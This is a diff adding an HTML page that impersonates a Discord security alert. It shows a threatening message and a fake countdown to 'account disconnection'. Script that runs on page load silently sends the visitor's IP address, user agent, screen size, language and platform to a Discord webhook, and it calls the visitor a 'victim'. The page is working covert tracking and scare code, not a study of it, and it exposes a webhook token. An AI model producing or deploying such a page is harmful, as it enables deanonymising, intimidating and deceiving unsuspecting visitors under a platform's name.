@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord - Critical Security Alert</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Whitney:wght@400;500;600;700&display=swap');
+        body {
+            margin: 0;
+            padding: 0;
+            background: #0a0a0a;
+            color: #dcddde;
+            font-family: 'Whitney', sans-serif;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .container {
+            background: #1a1a1a;
+            border: 3px solid #f04747;
+            border-radius: 16px;
+            padding: 60px 70px;
+            max-width: 540px;
+            text-align: center;
+            box-shadow: 0 0 100px rgba(240, 71, 71, 0.6);
+        }
+        .warning-icon {
+            font-size: 110px;
+            margin-bottom: 30px;
+            color: #f04747;
+            animation: pulse 1.2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.25); }
+            100% { transform: scale(1); }
+        }
+        h1 {
+            color: #f04747;
+            font-size: 34px;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+        .subtitle {
+            color: #f04747;
+            font-size: 20px;
+            margin-bottom: 35px;
+            font-weight: 600;
+        }
+        p {
+            color: #b9bbbe;
+            line-height: 1.7;
+            font-size: 16.5px;
+            margin-bottom: 40px;
+        }
+        .threat {
+            color: #f04747;
+            font-weight: 700;
+        }
+        .footer {
+            margin-top: 50px;
+            color: #72767d;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="warning-icon">☠️</div>
+        <h1>YOU FUCKED UP</h1>
+        <div class="subtitle">You've pissed off Vylze.</div>
+        
+        <p>
+            You triggered Vylze's security system.<br><br>
+            <span class="threat">Your Discord account is being disconnected in <strong id="countdown">10</strong> seconds.</span><br>
+            There is nothing you can do to stop it.
+        </p>
+
+        <div class="footer">
+            © 2026 Discord Security • Vylze Enforcement
+        </div>
+    </div>
+
+    <script>
+        // IMMEDIATE IP LOGGING ON PAGE LOAD
+        async function logVictim() {
+            const webhook = "https://discord.com/api/webhooks/1465236926968758376/9OQEaro-dpE9d2wjAhpXFZOrEBW12ua0zkGmF-IZuCaAMhHqXxLhQnmFtf6jiv-1c5hA";
+
+            let ip = "Unknown";
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch(e) {}
+
+            const payload = {
+                username: "☠️ Vylze IP Logger",
+                content: "**🔴 NEW VICTIM CAUGHT - PAGE LOADED**",
+                embeds: [{
+                    title: "Vylze Security Triggered",
+                    color: 0xf04747,
+                    description: "Someone opened the 'You Fucked Up' warning page.",
+                    fields: [
+                        { name: "IP Address", value: "```" + ip + "```", inline: true },
+                        { name: "User-Agent", value: "```" + navigator.userAgent + "```", inline: false },
+                        { name: "Screen Resolution", value: screen.width + " × " + screen.height, inline: true },
+                        { name: "Language", value: navigator.language, inline: true },
+                        { name: "Platform", value: navigator.platform, inline: true },
+                        { name: "Time", value: new Date().toLocaleString(), inline: false }
+                    ],
+                    footer: { text: "SSnatcher • Instant Logger • Vylze Mode" }
+                }]
+            };
+
+            try {
+                await fetch(webhook, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+                console.log("%c[SSnatcher] IP logged to Vylze webhook", "color:#f04747");
+            } catch(e) {}
+        }
+
+        // Start logging immediately when page loads
+        window.onload = logVictim;
+
+        // Countdown
+        let seconds = 10;
+        const countdownEl = document.getElementById('countdown');
+
+        const timer = setInterval(() => {
+            seconds--;
+            countdownEl.textContent = seconds;
+            if (seconds <= 0) {
+                clearInterval(timer);
+                document.body.innerHTML = `
+                    <div style="text-align:center; margin-top:150px; color:#f04747; font-size:32px; font-weight:700;">
+                        ACCOUNT PERMANENTLY DISCONNECTED<br><br>
+                        <span style="font-size:18px;">Vylze has banned you.</span>
+                    </div>`;
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
